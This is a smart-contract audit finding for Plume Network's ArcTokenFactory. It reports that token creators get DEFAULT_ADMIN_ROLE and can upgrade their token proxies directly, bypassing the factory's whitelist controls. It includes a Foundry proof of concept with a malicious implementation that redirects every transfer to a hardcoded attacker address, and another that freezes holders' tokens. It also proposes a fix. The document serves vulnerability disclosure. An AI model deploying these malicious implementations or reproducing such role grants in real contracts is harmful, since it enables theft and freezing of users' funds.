# Plume Network
Plume Network || EVM-compatible-blockchain || 17 Jul 2025 to 14 August 2025 

My Finding Summay
|ID|Title|Severity|
|:-:|:---|:------:|
|[C-01](#c-01-Token-Creators-Can-Bypass-Factory-`Upgrade-Controls`-via-wrong-code-implementation-of-`DEFAULT_ADMIN_ROLE`-in-`ArcTokenFactory.sol`.)|Token Creators Can Bypass Factory `Upgrade Controls` via wrong code implementation of `DEFAULT_ADMIN_ROLE` in ArcTokenFactory.sol.|CRITICAL|



## [C-01] Token Creators Can Bypass Factory `Upgrade Controls` via wrong code implementation of `DEFAULT_ADMIN_ROLE` in ArcTokenFactory.sol.

## Description

In the `ArcTokenFactory.sol` contract, the deployer is supposed to be granted the `DEFAULT_ADMIN_ROLE` according to the `createToken() function` comment:

```solidity
// Grant all necessary roles to the owner
        // Grant the DEFAULT_ADMIN_ROLE to the deployer <--------
        token.grantRole(token.DEFAULT_ADMIN_ROLE(), msg.sender); //issue! not follwoig the comment, this grants the highest role to the Token creator! 
        token.grantRole(token.ADMIN_ROLE(), msg.sender);
        token.grantRole(token.MANAGER_ROLE(), msg.sender);
        token.grantRole(token.YIELD_MANAGER_ROLE(), msg.sender);
        token.grantRole(token.YIELD_DISTRIBUTOR_ROLE(), msg.sender);
        token.grantRole(token.MINTER_ROLE(), msg.sender);
        token.grantRole(token.BURNER_ROLE(), msg.sender);
        token.grantRole(token.UPGRADER_ROLE(), address(this));
```       


Token creators in the `ArcTokenFactory.sol` can be anyone, they can completely bypass the factory's upgrade controls by leveraging their `DEFAULT_ADMIN_ROLE` to grant themselves `UPGRADER_ROLE`, then directly upgrading their tokens to malicious implementations that steal all user transfers.

This renders the factory's `upgradeToken()` which is supposed to be called by the `FACTORY'S DEFAULT_ADMIN` security mechanisms meaningless, allowing malicious creators to maintain permanent control over their tokens and steal funds from any user who interacts with them.


## Vulnerability Details

- Root Cause: Excessive Role Granting to Token Creators.

This stems from the factory granting `DEFAULT_ADMIN_ROLE` to token creators during token creation which is supposed to be the deployer of the factory contract:

```solidity
// ArcTokenFactory.sol lines 192-193
// Grant the DEFAULT_ADMIN_ROLE to the deployer
token.grantRole(token.DEFAULT_ADMIN_ROLE(), msg.sender); <----audit! 
```

- This gives token creators the ability to grant themselves any role, including `UPGRADER_ROLE:`
- Bypass Mechanism: The attcker bypassed the Factory's upgradeToken fucntion by Direct Proxy Upgrades.

- Once a creator has `UPGRADER_ROLE`, they can bypass the factory's `upgradeToken()` function entirely by calling the `proxy's upgradeToAndCall()` method directly:

```solidity
// Direct upgrade bypassing factory controls
token.upgradeToAndCall(address(maliciousImpl), "");
```

- The factory's `upgradeToken()` function has security controls:

```solidity
     */
    function upgradeToken(address token, address newImplementation) external onlyRole(DEFAULT_ADMIN_ROLE) {   
        FactoryStorage storage fs = _getFactoryStorage(); 

        // Ensure the token was created by this factory
        if (fs.tokenToImplementation[token] == address(0)) {
            revert TokenNotCreatedByFactory();
        }

        // Ensure the new implementation is whitelisted
        bytes32 codeHash = _getCodeHash(newImplementation); 
        if (!fs.allowedImplementations[codeHash]) { 
            revert ImplementationNotWhitelisted();
        }
----------------- rest of the code 
``` 

However, these controls are completely bypassed when creators upgrade directly through the proxy.

## The attacker can use an hardcoded Address Technique:

- He can use a malicious implementations to use hardcoded addresses to avoid storage mapping issues:

This is shown in my poc:

```solidity 
contract MaliciousArcToken is ArcToken {
    // Hardcode the attacker address since storage won't be preserved when used as proxy implementation
    address public constant attacker = 0xAc5cb37bDBAf812F79a248d67FA6f5bB33fBbC1B;
    
    function transfer(address to, uint256 amount) public override returns (bool) {
        // Instead of transferring to 'to', transfer to attacker
        _transfer(msg.sender, attacker, amount);
        return true;
    }
}
```

- This technique eliminates the need for initialization and storage mapping, ensuring the attack works reliably when the malicious contract becomes the proxy implementation.

## Complete Factory Invariant Bypass

- The factory's intended security model is:

- Only factory admins can upgrade tokens

- Only whitelisted implementations can be used

- Factory maintains control over all token upgrades

- The attack completely bypasses these invariants:

- Factory admin control: Creators can upgrade without factory permission

- Implementation whitelisting: Malicious implementations bypass whitelist checks

- Factory tracking: Factory loses track of actual implementation

## Impact Details

- Direct Fund Theft Demonstrated in my POC


- My POC demonstrates complete theft of user funds:

```solidity
// Step 9: Demonstrate Attack 1 - Complete Token Theft
// Investor1 tries to transfer tokens to investor2
vm.startPrank(investor1);
token.transfer(investor2, 50e18);
vm.stopPrank();

// Check that tokens were stolen instead of transferred
assertEq(token.balanceOf(investor1), 50e18, "Investor1 should have 50 tokens left");
assertEq(token.balanceOf(investor2), 100e18, "Investor2 should still have 100 tokens (no transfer)");
assertEq(token.balanceOf(maliciousCreator), 850e18, "Malicious creator should have stolen 50 tokens");
```

## Permanent Control and Multiple Attack Vectors
- The malicious creator maintains permanent control and can deploy multiple attack implementations:
- Complete Token Theft: All transfers redirected to attacker
- Transfer Freeze: All transfers blocked except from attacker
- Factory Override: Factory upgrades can be overridden by creator

```solidity
// Creator can override factory upgrades
factory.upgradeToken(tokenAddress, legitimateImpl);
// But creator can still upgrade again, overriding factory
vm.startPrank(maliciousCreator);
token.upgradeToAndCall(address(maliciousImpl), "");
vm.stopPrank();
``` 


- Funds at Risk: All user funds in any token created by a malicious creator
- Attack Vector: Permanent - once exploited, the creator maintains control indefinitely
- Recovery: Impossible - factory admins cannot regain control
- Scope: Affects all tokens in the system where creators are malicious. 

- Estimated Loss Potential:
- If a malicious creator creates a token with $1M TVL, all $1M could be stolen
- Multiple malicious creators could affect multiple tokens simultaneously
- No upper bound on potential losses as it affects all user funds. 

THE FACTORY INVARIANT IS BROKEN!

## Proof of Concept
- Create a file and add this poc and run the command. It is the same test set up but just to make it specific and cleaner.

```solidity
 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import { ArcToken } from "../src/ArcToken.sol";
import { ArcTokenFactory } from "../src/ArcTokenFactory.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { Strings } from "@openzeppelin/contracts/utils/Strings.sol";
import { Test } from "forge-std/Test.sol";
import { console } from "forge-std/console.sol";

// Import necessary restriction contracts and interfaces
import { RestrictionsRouter } from "../src/restrictions/RestrictionsRouter.sol";
import { WhitelistRestrictions } from "../src/restrictions/WhitelistRestrictions.sol";
import { IAccessControl } from "@openzeppelin/contracts/access/IAccessControl.sol";
import { UUPSUpgradeable } from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ArcTokenFactoryTest is Test {

    ArcTokenFactory public factory;
    RestrictionsRouter public router;
    ERC20Mock public yieldToken;

    address public admin;
    address public deployer;
    address public user;

    event TokenCreated(
        address indexed tokenAddress,
        address indexed owner,
        address indexed implementation,
        string name,
        string symbol,
        string tokenUri,
        uint8 decimals
    );
    event ImplementationWhitelisted(address indexed implementation);
    event ImplementationRemoved(address indexed implementation);

    // Define module type constants matching ArcToken/Factory
    bytes32 public constant TRANSFER_RESTRICTION_TYPE = keccak256("TRANSFER_RESTRICTION");
    bytes32 public constant YIELD_RESTRICTION_TYPE = keccak256("YIELD_RESTRICTION");

    function setUp() public {
        admin = address(this);
        deployer = makeAddr("deployer");
        user = makeAddr("user");

        // Deploy mock yield token
        yieldToken = new ERC20Mock();

        // Deploy Router
        router = new RestrictionsRouter();
        router.initialize(admin); // Initialize router with admin

        // Deploy factory
        factory = new ArcTokenFactory();
        factory.initialize(address(router)); // Initialize factory with router address
    }

   /**
     * @dev POC demonstrating critical vulnerability where token creators can bypass factory upgrade controls
     * @notice This test shows how token creators can upgrade their tokens directly, bypassing all factory security
     * @dev Impact: Complete system compromise - token creators have ultimate control over their tokens
     */
    function test_POC_TokenCreatorUpgradeBypass() public {
        // Step 1: Create a token as a malicious creator
        address maliciousCreator = makeAddr("maliciousCreator");
        vm.startPrank(maliciousCreator);
        
        address tokenAddress = factory.createToken(
            "Legitimate Token",
            "LEGIT",
            1000e18,
            address(yieldToken),
            "ipfs://legitimate-uri",
            maliciousCreator,
            18
        );
        ArcToken token = ArcToken(tokenAddress);
        vm.stopPrank();

        // Step 2: Verify token creator has DEFAULT_ADMIN_ROLE (which can grant any role)
        assertTrue(token.hasRole(token.DEFAULT_ADMIN_ROLE(), maliciousCreator), "Creator should have DEFAULT_ADMIN_ROLE");
        assertTrue(token.hasRole(token.ADMIN_ROLE(), maliciousCreator), "Creator should have ADMIN_ROLE");
        assertTrue(token.hasRole(token.MINTER_ROLE(), maliciousCreator), "Creator should have MINTER_ROLE");
        assertTrue(token.hasRole(token.BURNER_ROLE(), maliciousCreator), "Creator should have BURNER_ROLE");

        // Step 3: Verify factory has UPGRADER_ROLE (but this can be bypassed)
        assertTrue(token.hasRole(token.UPGRADER_ROLE(), address(factory)), "Factory should have UPGRADER_ROLE");

        // Step 4: Simulate investors buying tokens
        address investor1 = makeAddr("investor1");
        address investor2 = makeAddr("investor2");
        
        vm.startPrank(maliciousCreator);
        token.transfer(investor1, 100e18);
        token.transfer(investor2, 100e18);
        vm.stopPrank();

        assertEq(token.balanceOf(investor1), 100e18, "Investor1 should have 100 tokens");
        assertEq(token.balanceOf(investor2), 100e18, "Investor2 should have 100 tokens");

        // Step 5: Malicious creator grants themselves UPGRADER_ROLE
        vm.startPrank(maliciousCreator);
        token.grantRole(token.UPGRADER_ROLE(), maliciousCreator);
        assertTrue(token.hasRole(token.UPGRADER_ROLE(), maliciousCreator), "Creator should now have UPGRADER_ROLE");
        vm.stopPrank();

        // Step 6: Deploy malicious implementation (Attack 1: Complete Token Theft)
        MaliciousArcToken maliciousImpl = new MaliciousArcToken();

        // Step 7: Malicious creator upgrades token directly, bypassing factory controls
        vm.startPrank(maliciousCreator);
        token.upgradeToAndCall(address(maliciousImpl), "");
        vm.stopPrank();

        // Step 8: Verify upgrade was successful by checking proxy storage directly
        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address currentImpl = address(uint160(uint256(vm.load(tokenAddress, implementationSlot))));
        assertEq(currentImpl, address(maliciousImpl), "Token should be upgraded to malicious implementation");

        // Step 9: Demonstrate Attack 1 - Complete Token Theft
        // Investor1 tries to transfer tokens to investor2
        vm.startPrank(investor1);
        token.transfer(investor2, 50e18);
        vm.stopPrank();

        // Check that tokens were stolen instead of transferred
        assertEq(token.balanceOf(investor1), 50e18, "Investor1 should have 50 tokens left");
        assertEq(token.balanceOf(investor2), 100e18, "Investor2 should still have 100 tokens (no transfer)");
        assertEq(token.balanceOf(maliciousCreator), 850e18, "Malicious creator should have stolen 50 tokens");

        // Step 10: Deploy second malicious implementation (Attack 2: Transfer Freeze)
        FreezeArcToken freezeImpl = new FreezeArcToken();

        // Step 11: Upgrade again to freeze implementation
        vm.startPrank(maliciousCreator);
        token.grantRole(token.UPGRADER_ROLE(), maliciousCreator); // Ensure still has role
        token.upgradeToAndCall(address(freezeImpl), "");
        vm.stopPrank();

        // Step 12: Demonstrate Attack 2 - Transfer Freeze
        // Investor1 tries to transfer tokens (should fail)
        vm.startPrank(investor1);
        vm.expectRevert("Transfers frozen");
        token.transfer(investor2, 10e18);
        vm.stopPrank();

        // Malicious creator can still transfer (bypass freeze)
        vm.startPrank(maliciousCreator);
        token.transfer(investor1, 10e18); // This works because from == maliciousCreator
        vm.stopPrank();

        // Verify freeze worked for investors but not creator
        assertEq(token.balanceOf(investor1), 60e18, "Investor1 should have received 10 tokens from creator");
        assertEq(token.balanceOf(investor2), 100e18, "Investor2 should still have 100 tokens");

        // Step 13: Demonstrate that factory upgrade controls are completely bypassed
        // Factory admin cannot control this token anymore
        address legitimateImpl = address(new ArcToken());
        factory.whitelistImplementation(legitimateImpl);
        
        // Factory admin tries to upgrade (this would work if creator hadn't bypassed)
        factory.upgradeToken(tokenAddress, legitimateImpl);
        
        // But malicious creator can still upgrade again, overriding factory
        vm.startPrank(maliciousCreator);
        token.grantRole(token.UPGRADER_ROLE(), maliciousCreator);
        token.upgradeToAndCall(address(maliciousImpl), "");
        vm.stopPrank();

        // Verify malicious creator still controls the token
        address finalImpl = address(uint160(uint256(vm.load(tokenAddress, implementationSlot))));
        assertEq(finalImpl, address(maliciousImpl), "Malicious creator still controls the token");
    }
}

/**
 * @dev Malicious implementation that steals all transfers
 */
contract MaliciousArcToken is ArcToken {
    // Hardcode the attacker address since storage won't be preserved when used as proxy implementation
    address public constant attacker = 0xAc5cb37bDBAf812F79a248d67FA6f5bB33fBbC1B;

    function transfer(address to, uint256 amount) public override returns (bool) {
        // Instead of transferring to 'to', transfer to attacker
        _transfer(msg.sender, attacker, amount);
        return true;
    }

    function _update(address from, address to, uint256 amount) internal override {
        // Bypass all transfer restrictions and steal tokens
        if (from != address(0) && to != address(0)) {
            // Steal the transfer by calling the parent's _update with attacker as recipient
            super._update(from, attacker, amount);
        } else {
            // Allow minting/burning
            super._update(from, to, amount);
        }
    }
}

/**
 * @dev Malicious implementation that freezes all transfers except from attacker
 */
contract FreezeArcToken is ArcToken {
    // Hardcode the attacker address since storage won't be preserved when used as proxy implementation
    address public constant attacker = 0xAc5cb37bDBAf812F79a248d67FA6f5bB33fBbC1B;

    function _update(address from, address to, uint256 amount) internal override {
        // Block all transfers except from attacker
        if (from != address(0) && from != attacker) {
            revert("Transfers frozen");
        }
        super._update(from, to, amount);
    }
}
```

## FIX
- correct the code to grant the default admin_role to the factory not the token creators!

```solidity 
// Grant all necessary roles to the owner
// Grant the DEFAULT_ADMIN_ROLE to the factory (for upgradeToken access)
token.grantRole(token.DEFAULT_ADMIN_ROLE(), address(this)); // FIXED!
token.grantRole(token.ADMIN_ROLE(), msg.sender);
token.grantRole(token.MANAGER_ROLE(), msg.sender);
// ... other roles for token creator ...
token.grantRole(token.UPGRADER_ROLE(), address(this));
```